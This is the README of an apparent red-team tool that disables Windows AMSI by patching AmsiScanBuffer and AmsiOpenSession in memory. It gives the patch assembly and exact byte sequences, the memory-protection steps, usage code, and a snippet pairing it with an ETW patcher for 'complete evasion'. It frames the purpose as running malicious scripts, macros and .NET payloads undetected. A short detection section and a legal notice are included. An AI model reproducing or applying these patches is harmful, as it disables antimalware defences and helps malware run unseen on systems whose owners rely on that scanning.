# AMSI Bypass

Windows Antimalware Scan Interface (AMSI) bypass tool for security research and red team operations.

## Overview

AMSI Bypass disables Windows AMSI by patching AMSI functions in memory. This prevents Windows Defender and other security products from scanning scripts, PowerShell commands, and in-memory payloads.

## Features

- Automatic AMSI bypass on execution
- Patches `AmsiScanBuffer` and `AmsiOpenSession`
- Verification of bypass success
- Automatic restoration on exit
- Clean, direct execution (no menus)

## How It Works

The tool patches AMSI functions in `amsi.dll`:

**AmsiScanBuffer patch:**
```asm
mov eax, 0x80070057    ; E_INVALIDARG
ret
```

**AmsiOpenSession patch:**
```asm
xor eax, eax           ; Return 0
ret
```

This causes AMSI to fail gracefully, allowing malicious content to execute without scanning.

## Compilation

**Requirements:**
- Visual Studio 2019/2022
- Windows SDK 10.0
- C++17 or later

**Build:**
1. Open `amsi-bypass.vcxproj` in Visual Studio
2. Select `Release` configuration and `x64` platform
3. Build Solution (Ctrl+Shift+B)

Output: `x64\Release\amsi-bypass.exe`

## Usage

Simply run the executable:

```
amsi-bypass.exe
```

Output:
```
[*] AMSI Bypass
[*] Patching AMSI functions

[+] AmsiScanBuffer patched
[+] AmsiOpenSession patched

[+] AMSI bypassed successfully

[*] Testing AMSI bypass
[+] AMSI bypass verified - AmsiScanBuffer returns E_INVALIDARG

[+] AMSI is now disabled
[+] PowerShell scripts will not be scanned
[+] Malicious payloads will not be detected
```

### Programmatic Usage

```cpp
#include "AmsiBypass.h"

int main() {
    AmsiBypass bypass;
    
    // Bypass AMSI
    bypass.BypassAll();
    
    // Your code here - AMSI is disabled
    
    // Optional: Restore
    bypass.RestoreAmsi();
    
    return 0;
}
```

## What Gets Bypassed

| Component | Effect |
|-----------|--------|
| **PowerShell** | Scripts execute without AMSI scanning |
| **Windows Defender** | Cannot scan in-memory content via AMSI |
| **VBScript/JScript** | Scripts execute without detection |
| **Office Macros** | Macros execute without AMSI checks |
| **.NET Assemblies** | In-memory assemblies not scanned |

## Use Cases

**Red Team Operations:**
- Execute PowerShell scripts without detection
- Load malicious .NET assemblies
- Run obfuscated payloads
- Bypass behavioral detection

**Security Research:**
- Test AMSI effectiveness
- Analyze security product dependencies
- Study bypass techniques

**Penetration Testing:**
- Demonstrate detection gaps
- Validate security controls
- Execute post-exploitation tools

## Verification

After running, verify the bypass:

1. Open PowerShell
2. Try to execute a known malicious string
3. AMSI should not detect it

Example test:
```powershell
# This would normally be detected by AMSI
$str = 'amsiInitFailed'
```

## Detection

AMSI bypass can be detected by:
- Memory scanning of `amsi.dll` for modifications
- Integrity checks on AMSI functions
- Monitoring `VirtualProtect` calls on `amsi.dll`
- ETW events for AMSI tampering

## Combining with ETW Bypass

For complete evasion, combine with ETW Patcher:

```cpp
// Bypass both AMSI and ETW
EtwPatcher etwBypass;
AmsiBypass amsiBypass;

etwBypass.PatchAllEtwFunctions();
amsiBypass.BypassAll();

// Now completely invisible to Windows Defender
```

## Technical Details

**Patch Bytes:**

AmsiScanBuffer:
```
Original:  48 89 5C 24 08 48 89 74 24 10 ...
Patched:   B8 57 00 07 80 C3 (mov eax, 0x80070057; ret)
```

AmsiOpenSession:
```
Original:  48 89 5C 24 08 57 48 83 EC 20 ...
Patched:   33 C0 C3 (xor eax, eax; ret)
```

**Memory Protection:**
- Changes page protection to `PAGE_EXECUTE_READWRITE`
- Applies patch
- Restores original protection
- Flushes instruction cache

## Limitations

- Requires code execution in target process
- Usermode only
- May be detected by advanced security products
- Windows 10/11 only

## Project Structure

```
amsi-bypass/
├── AmsiBypass.h          # Main class header
├── AmsiBypass.cpp        # Implementation
├── main.cpp              # Direct execution
└── amsi-bypass.vcxproj   # Visual Studio project
```

## Legal Notice

This tool is intended for educational purposes and authorized security testing only. Unauthorized use may violate applicable laws and regulations. Use responsibly and only on systems you own or have explicit permission to test.

## References

- [AMSI Documentation](https://docs.microsoft.com/en-us/windows/win32/amsi/)
- [AMSI Bypass Techniques](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
- Windows Internals by Russinovich, Solomon, Ionescu

## License

This project is provided as-is for security research and educational purposes.
